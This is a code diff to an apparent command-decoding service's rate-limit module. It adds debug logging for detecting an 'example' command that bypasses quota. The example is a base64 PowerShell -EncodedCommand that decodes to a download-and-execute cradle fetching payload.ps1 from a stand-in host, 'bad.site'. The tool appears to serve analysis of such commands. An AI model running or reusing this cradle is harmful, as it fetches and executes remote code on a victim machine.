@@ -6,7 +6,7 @@ from datetime import datetime, timedelta
 from services.session_manager import get_supabase_client
 
 # ✅ Example command that doesn't count towards quota
-EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA" -noExit'
+EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'
 
 
 async def check_session_rate_limit_from_db(
@@ -170,7 +170,20 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
         Dictionary with decode permission and usage details
     """
     
+    # ✅ DEBUG: Log example command detection
+    print(f"\n[DECODE_CHECK] Checking if command is example...")
+    if command:
+        print(f"[DECODE_CHECK] Command received (first 100 chars): {command[:100]}...")
+        print(f"[DECODE_CHECK] Command length: {len(command)}")
+        print(f"[DECODE_CHECK] EXAMPLE_ENCODED_COMMAND length: {len(EXAMPLE_ENCODED_COMMAND)}")
+        print(f"[DECODE_CHECK] Command stripped: {command.strip()[:100]}...")
+        print(f"[DECODE_CHECK] Example stripped: {EXAMPLE_ENCODED_COMMAND.strip()[:100]}...")
+        print(f"[DECODE_CHECK] Are they equal? {command.strip() == EXAMPLE_ENCODED_COMMAND.strip()}")
+    else:
+        print(f"[DECODE_CHECK] No command provided")
+    
     if command and command.strip() == EXAMPLE_ENCODED_COMMAND.strip():
+        print(f"[DECODE_CHECK] ✅ EXAMPLE COMMAND DETECTED - Returning is_example=True")
         return {
             "can_decode": True,
             "current_usage": 0,
@@ -179,6 +192,8 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
             "seconds_until_reset": None,
             "is_example": True
         }
+    else:
+        print(f"[DECODE_CHECK] ❌ NOT example command")
     # For authenticated users, fetch their plan
     if user_id:
         plan_features = await get_user_plan_features(user_id)
